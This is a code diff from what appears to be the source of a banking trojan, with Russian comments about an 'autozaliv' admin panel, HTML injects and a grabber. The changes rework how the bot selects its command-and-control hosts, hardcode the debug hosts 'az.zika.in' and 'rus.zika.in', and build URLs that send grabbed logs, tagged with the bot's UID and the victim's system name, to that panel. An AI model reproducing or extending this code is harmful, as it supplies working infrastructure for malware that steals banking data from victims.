@@ -3,8 +3,6 @@
 
 
 #include "Modules.h"
-#include "StrConsts.h"
-#include "BotHTTP.h"
 
 
 #ifdef AzConfigH
@@ -12,7 +10,7 @@
 	//   Файл включен в модули проекта
 	//   используем отдельные настройки
 	//****************************************
-//	#define USE_AZ_CONFIG
+	#define USE_AZ_HOSTS
     #define USE_AZ_USER
 #endif
 
@@ -23,6 +21,8 @@
 #include "BotHosts.h"
 #include "BotDef.h"
 #include "BotConfig.h"
+#include "StrConsts.h"
+#include "BotHTTP.h"
 //-----------------------------------------------------------------------------
 
 
@@ -65,28 +65,65 @@ string GetAzUser()
 
 //-------------------------------------------------------
 
-
-
-#ifdef USE_AZ_CONFIG
-
-	char AZ_HOSTS[AZCONFIG_PARAM_SIZE_HOSTS] = AZCONFIG_PARAM_NAME_HOSTS;
-
-	#define AZ_HOSTS_HASH 0xE0203A42 /* __AZ_HOSTS__ */
-
-
-	//*****************************************************************
-	//  Хосты, которые будут вшиваться в HTML инжекты
-	//*****************************************************************
-	#ifdef DEBUGCONFIG
-		// Отладочные данные
-		char AZ_SCRIPTS_HOSTS[] = "rus.zika.in\0";
+//*****************************************************************
+//  Хосты, админки автозалива.
+//  Массив заканчивающийся пустой строкой
+//*****************************************************************
+#ifdef USE_AZ_HOSTS
+	#ifndef DEBUGCONFIG
+		char AZ_HOSTS[AZCONFIG_PARAM_SIZE_HOSTS] = AZCONFIG_PARAM_NAME_HOSTS;
 	#else
+		char AZ_HOSTS[AZCONFIG_PARAM_SIZE_HOSTS] = "az.zika.in\0";
+	#endif
+#endif
+
+
+//*****************************************************************
+//  Хосты, которые будут вшиваться в HTML инжекты
+//*****************************************************************
+#ifdef USE_AZ_CONFIG
+	#ifndef DEBUGCONFIG
 		// Рабочий массив
 		char AZ_SCRIPTS_HOSTS[AZCONFIG_PARAM_SIZE_SCRIPTHOSTS] = AZCONFIG_PARAM_NAME_SCRIPTHOSTS;
+	#else
+		// Отладочные данные
+		char AZ_SCRIPTS_HOSTS[] = "az.zika.in\0";
 	#endif
+#endif
 
-	#define AZ_SCRIPTS_HOSTS_HASH 0x94D84D31 /* __AZ_SCRIPTS_HOSTS__ */
 
+
+//----------------------------------------
+//  GetAzHostsBuf
+//  Фнкция возвращает казатель на бфер
+//  хостов админки автозалива. AZ админка
+//----------------------------------------
+PCHAR GetAzHostsBuf()
+{
+	#ifdef USE_AZ_HOSTS
+		return  AZ_HOSTS;
+	#else
+		return GetBotHosts();
+	#endif
+}
+
+
+
+//----------------------------------------
+//  IsAzHost
+//  функция возвращает истину если
+//  указанный хост принадлежит массиву
+//   хостов админки AZ
+//----------------------------------------
+bool IsAzHost(const char* Host)
+{
+	#ifdef USE_AZ_HOSTS
+	TStrEnum E(GetAzHostsBuf(), AZCONFIG_PARAM_ENCRYPTED_HOSTS, 0);
+		while (E.Next())
+			if (E.Line() == Host) return true;
+	#endif
+	return false;
+}
 
 
 //----------------------------------------------------
@@ -95,30 +132,62 @@ string GetAzUser()
 //----------------------------------------------------
 string GetAzHost()
 {
-	#ifdef USE_AZ_CONFIG
-		return GetActiveHostFromBuf2(AZ_HOSTS, AZ_HOSTS_HASH, AZCONFIG_PARAM_ENCRYPTED_HOSTS);
-	#else
-    	return GetActiveHost2();
-	#endif
+	return GetActiveHostFromBuf2(GetAzHostsBuf(), 0, AZCONFIG_PARAM_ENCRYPTED_HOSTS);
 }
 //-----------------------------------------------------------------------------
 
 
 //----------------------------------------------------
-//  GetAzURL - Функция возвращает полный адрес на
+//  GetAzURL
+//   Функция возвращает полный адрес на
 //   основе Хоста системы и переданного пути
 //----------------------------------------------------
 string GetAzURL(const char*  Path)
 {
-	string Host = GetAzHost();
-	if (Host.IsEmpty()) return Host;
 	TURL URL;
-	URL.Host = Host;
+	URL.Host = GetAzHost();
 	URL.Path = Path;
-
-    return URL.URL();
+	return URL.URL();
 }
 //-----------------------------------------------------------------------------
+
+
+
+//------------------------------------------------------
+//  GetAzGrabberURLPath
+//  Функция возвращает путь URL для
+//  отправки лога грабера
+//------------------------------------------------------
+// Строка определена в модуле StrConsts.cpp
+extern CSSTR EStrAzGrabberPathMask[];
+
+string GetAzGrabberURLPath(const string& SystemName,  const char* Action)
+{
+	string Mask = GetStr(EStrAzGrabberPathMask);
+	if (STRA::IsEmpty(Action)) Action = "save_tf";
+	string Path;
+	Path.Format(Mask.t_str(), Bot->UID().t_str(), SystemName.t_str(), GetAzUser().t_str(), Action);
+	return Path;
+}
+
+
+
+
+//------------------------------------------------------
+//  GetAzGrabberURL
+//  Функция возвращает адрес в админке
+//  AZ для отправки лога грабера
+//------------------------------------------------------
+string GetAzGrabberURL(const string& SystemName,  const char* Action)
+{
+	return GetAzURL(GetAzGrabberURLPath(SystemName, Action).t_str());
+}
+
+
+
+
+
+#ifdef USE_AZ_CONFIG
 
 //----------------------------------------------------
 //  AzInicializeHostChecker - Функция инициализирует
@@ -243,44 +312,3 @@ void AzInizializeHTMLInjects()
 
 
 
-//------------------------------------------------------
-//  GetAzGrabberURLPath Функция возвращает путь URL для
-//  отправки лога грабера
-//------------------------------------------------------
-// Строка определена в модуле StrConsts.cpp
-extern CSSTR EStrAzGrabberPathMask[];
-
-string GetAzGrabberURLPath(const string& SystemName,  const char* Action)
-{
-	string Mask = GetStr(EStrAzGrabberPathMask);
-	if (STRA::IsEmpty(Action)) Action = "save_tf";
-	string Path;
-	Path.Format(Mask.t_str(), Bot->UID().t_str(), SystemName.t_str(), GetAzUser().t_str(), Action);
-	return Path;
-}
-
-
-
-
-//------------------------------------------------------
-//  GetAzGrabberURL - Функция возвращает адрес в админке
-//  AZ для отправки лога грабера
-//------------------------------------------------------
-string GetAzGrabberURL(const string& SystemName,  const char* Action)
-{
-
-	string StrURL;
-
-	// Временны "КОСТЫЛЬ"
-	// Хосты аз берём из мдуля Rafa.h
-	// Связано с некорректно организацие системы плучения хостов
-	// для различных систем. В дальнешем все хсты админок аз
-	// должны быть сведены в этот модуль
-	#ifdef RafaH
-		TURL  URL;
-		URL.Host = Rafa::GetWorkHost();
-		URL.Path = GetAzGrabberURLPath(SystemName, Action);
-        StrURL = URL.URL();
-	#endif
-    return StrURL;
-}
